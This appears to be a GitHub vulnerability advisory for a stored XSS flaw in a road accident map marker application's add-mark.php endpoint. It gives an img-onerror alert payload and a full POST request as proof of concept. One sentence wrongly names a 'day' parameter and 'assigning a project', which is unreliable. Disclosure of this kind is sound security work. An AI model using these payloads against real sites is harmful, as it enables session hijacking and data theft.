# Stored XSS Vulnerability in Road Accident Map Marker

### Title: Stored XSS Vulnerability in Road Accident Map Marker 
### Affected Component: /endpoint/add-mark.php
### CWE: CWE-79 (Improper Neutralization of Input During Web Page Generation)

### Impact:
The web application is vulnerable to stored cross-site scripting (XSS) attacks within the Road Accident Marker Area functionality. Attackers can exploit this vulnerability by injecting malicious JavaScript code into the "mark_name" parameter,
which is used to mark locations. When unsuspecting users view the marked road accident area, the injected script executes within their browsers, potentially leading to various malicious activities such as session hijacking or data theft.

### Proof of Concept (POC):
To exploit the stored XSS vulnerability, attackers craft a payload containing malicious JavaScript code and inject it into the "day" parameter while assigning a project. For example, 
submitting the payload `<img+src=x+onerror=alert(PwnedPixel)>` triggers an alert box when viewed. This demonstrates the successful execution of arbitrary scripts within the application.

#### HTTP Request:
```
POST /road-accident-map-marker/endpoint/add-mark.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 130
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/road-accident-map-marker/



date=2024-12-27&mark_name=<img+src=x+onerror=alert(PwnedPixel)>&details=x&mark_lat=9.696874&mark_long=122.802429
```

### Proof with Screenshot:
![image](https://github.com/user-attachments/assets/4b7d7121-0689-4bae-86ae-d651eb8ae599)


## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
